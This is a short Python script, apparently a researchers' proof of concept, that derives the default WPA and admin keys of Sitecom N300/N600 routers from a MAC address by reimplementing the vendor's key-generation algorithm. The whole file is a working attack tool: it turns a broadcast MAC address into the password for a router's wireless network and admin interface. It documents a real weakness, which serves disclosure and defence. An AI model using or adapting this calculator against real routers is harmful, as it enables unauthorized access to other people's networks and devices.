#
# Sitecom N300/N600 default WPA/admin key calculator
# ==================================================
# 
# Authors: 
#   Roberto Paleari     (roberto.paleari@emaze.net, @rpaleari)
#   Alessandro Di Pinto (alessandro.dipinto@emaze.net, @adipinto)
#

import string
import sys

CHARSET = "123456789abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ"

def increment_hex(hexchar):
    hexchar = hexchar.upper()
    assert hexchar in string.hexdigits
    return string.hexdigits[(string.hexdigits.find(hexchar)+1) % len(string.hexdigits)]

def mangle_key(mac, op1, op2):
    def LO(v):  return v & 0xffffffff
    def HI(v):  return (v >> 32) & 0xffffffff

    a0 = LO(op1 * op2)
    v0 = HI(a0 * 0x94f2095)

    v1 = v0 >> 1
    v0 = a0 >> 31
    v1 = v1 - v0
    v0 = v1

    v0 = LO(v0 << 3) - v1
    v0 = LO(v0 << 3) - v1
    v0 = a0 - v0

    return CHARSET[v0]

def calculate_key(mac):
    key = [0]*8

    secondhalf = "0"
    for c in mac[6:]:
        if c.isdigit():
            secondhalf += c
        else:
            break
    secondhalf = int(secondhalf)

    mac = [ord(x) for x in mac]

    opmap = [
        (mac[11] + mac[5] + secondhalf, mac[9]  + mac[11] + mac[3]),
        (mac[11] + mac[6] + secondhalf, mac[8]  + mac[11] + mac[10]),
        (mac[3]  + mac[5] + secondhalf, mac[7]  + mac[11] + mac[9]),
        (mac[11] + mac[4] + mac[5],     mac[6]  + mac[7]  + secondhalf),
        (mac[6]  + mac[7] + secondhalf, mac[8]  + mac[11] + mac[9]),
        (mac[11] + mac[3] + mac[4],     mac[5]  + mac[11] + secondhalf),
        (mac[11] + mac[6] + mac[8],     mac[4]  + mac[11] + secondhalf),
        (mac[11] + mac[7] + mac[8],     mac[10] + mac[11] + secondhalf),
        ]
    
    for i in range(8):
        op1, op2 = opmap[i]
        key[i] = mangle_key(mac, op1, op2)

    return "".join(key)

def main():
    if len(sys.argv) != 2:
        print >> sys.stderr, "[!] Syntax: python %s <MAC address>" % sys.argv[0]
        exit(0)

    mac = sys.argv[1]
    if ":" in mac:
        mac = mac.replace(":", "")

    seed = mac.upper()

    print "==== Single-band (N300/WLM-3500) ===="
    key = calculate_key(seed)
    print "KEY 2.4GHz:", key
    print

    print "==== Dual-band (N600/WLM-5500) ===="
    last = seed[-1]
    for i in range(2):
        last = increment_hex(last)
        key = calculate_key(seed[:-1] + last)
        if i == 0:
            print "KEY 5GHz:  ", key
        else:
            print "KEY 2.4GHz:", key

if __name__ == "__main__":
    main()